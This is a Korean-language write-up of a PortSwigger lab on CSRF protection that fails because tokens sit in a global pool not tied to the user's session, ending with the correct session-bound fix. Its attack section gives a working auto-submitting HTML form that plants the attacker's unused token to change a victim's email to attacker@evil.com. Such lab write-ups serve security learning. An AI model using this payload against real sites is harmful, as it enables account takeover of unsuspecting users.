# Lab: CSRF where token is not tied to user session

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — CSRF 토큰 / 전역 토큰 풀 / 세션 비연결
- **링크**: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

## 목표

서버가 CSRF 토큰을 사용자 세션과 연결하지 않고 전역 풀(pool)로 관리하는 허점을 이용해, 공격자 자신의 유효한 CSRF 토큰을 피해자의 요청에 사용하여 이메일을 변경한다.

## 취약점 분석

### 잘못된 구현 — 전역 토큰 풀

```python
# 서버 내부 (전역 풀 방식)
valid_tokens = set()  # 모든 사용자의 토큰을 한 곳에 보관

def generate_csrf_token(session):
    token = random_token()
    valid_tokens.add(token)  # 세션 연결 없이 그냥 추가
    return token

def validate_csrf_token(token):
    if token in valid_tokens:
        valid_tokens.remove(token)  # 사용 후 제거 (일회용)
        return True
    return False
    # ← 어떤 사용자의 세션인지 전혀 확인하지 않음
```

```
[서버가 확인하는 것]
  "이 토큰이 유효한 토큰 목록에 있는가?" → O/X

[서버가 확인하지 않는 것]
  "이 토큰이 요청한 사용자의 세션에서 발급된 것인가?" → 확인 안 함
```

### 공격이 가능한 이유

```
공격자(attacker) 계정:
  로그인 → CSRF 토큰 A 발급 → 토큰 A 를 사용하지 않고 보관

피해자(victim) 계정:
  공격자 페이지 방문 → 폼 자동 제출
  Body: email=attacker@evil.com&csrf=토큰_A

서버:
  "토큰 A 가 유효한 풀에 있나?" → 있음 (공격자가 사용 안 했으니까)
  → 검증 통과 → 이메일 변경!
  → 실제로 이 토큰이 피해자 세션 것인지는 확인 안 함
```

## 공격 방법

### 1단계: 공격자 계정에서 유효한 CSRF 토큰 획득

```
1. 공격자 계정(wiener:peter)으로 로그인
2. /my-account 페이지에서 이메일 변경 폼의 csrf 값 확인
   <input type="hidden" name="csrf" value="ATTACKER_TOKEN_XYZ">
3. 이 토큰을 제출하지 않고 복사해 둠 (풀에서 제거되지 않게)
```

### 2단계: 피해자에게 전달할 페이로드 작성

```html
<html>
  <body>
    <form action="https://VULNERABLE-SITE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="ATTACKER_TOKEN_XYZ">
      <!-- 공격자 자신의 유효한 토큰을 삽입 -->
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 3단계: 피해자가 페이지 방문 → 이메일 변경

```
피해자 브라우저:
  POST /my-account/change-email
  Cookie: session=VICTIM_SESSION    ← 피해자 세션
  Body: email=attacker@evil.com&csrf=ATTACKER_TOKEN_XYZ  ← 공격자 토큰

서버:
  세션: victim 의 세션 → 피해자 계정 식별
  토큰: ATTACKER_TOKEN_XYZ → 풀에 있음 → 유효!
  → 피해자 계정의 이메일을 attacker@evil.com 으로 변경
```

## 이전 랩들과의 비교

| 랩 | 우회 방법 | 서버의 착각 |
|----|---------|-----------|
| 001 | 토큰 없이 POST | 방어 없음 |
| 002 | GET 으로 메서드 변경 | POST 에만 검증하면 됨 |
| 003 | 토큰 파라미터 제거 | 토큰 있으면 검증하면 됨 |
| 004 (이번) | 공격자 토큰을 피해자 요청에 사용 | 토큰이 유효하면 됨 |

## 핵심 정리

- CSRF 토큰은 반드시 **발급한 세션에만 유효**해야 한다 — 전역 풀로 관리하면 교차 사용이 가능하다.
- 토큰 검증 시 "이 토큰이 유효한가" 뿐 아니라 "이 토큰이 현재 세션에서 발급된 것인가" 를 함께 확인해야 한다.
- **올바른 구현**:
  ```python
  # 세션별 토큰 저장
  session['csrf_token'] = random_token()

  # 검증 시 세션과 비교
  def validate(token, session):
      return token == session.get('csrf_token')
      # 다른 세션의 토큰은 절대 통과 불가
  ```

## 배운 점 및 추가 학습

### CSRF 토큰의 올바른 생명주기

```
[발급]
  사용자 로그인 또는 폼 접근 시
  → 서버: 임의값 생성 → 해당 세션에 저장 → 폼 hidden 필드로 반환

[검증]
  폼 제출 시
  → 서버: 요청의 토큰 == 해당 세션에 저장된 토큰 ?
  → 일치 → 처리 / 불일치 또는 없음 → 거부

[무효화]
  처리 후 → 토큰 갱신 또는 제거 (재사용 방지)
  세션 종료 시 → 토큰 자동 소멸

올바른 구조:
  토큰 ↔ 세션 1:1 연결
  다른 세션의 토큰은 절대 사용 불가
```

### 토큰 전역 풀 vs 세션 연결 비교

```
[전역 풀 방식 — 잘못됨]
  valid_tokens = {토큰A, 토큰B, 토큰C, ...}  # 모든 사용자 토큰 혼재
  validate(token) → token in valid_tokens

  문제:
    - 공격자 토큰 A 로 피해자 요청 위조 가능
    - 토큰 A 가 유효한 풀에 있으면 어느 세션이든 통과

[세션 연결 방식 — 올바름]
  session_A['csrf'] = 토큰A
  session_B['csrf'] = 토큰B

  validate(token, session) → token == session['csrf']

  방어:
    - 피해자(session_B) 요청에 공격자 토큰A 사용
    - 토큰A ≠ session_B['csrf'] → 거부
```

### 다음 랩 예고 — 토큰이 세션이 아닌 쿠키에 연결

```
이번 랩의 변형:
  토큰이 세션과 연결되지 않고 → 별도 쿠키와 연결
  쿠키는 조작 가능 → 또 다른 우회 가능
  (Double Submit Cookie 패턴의 취약한 구현)
```
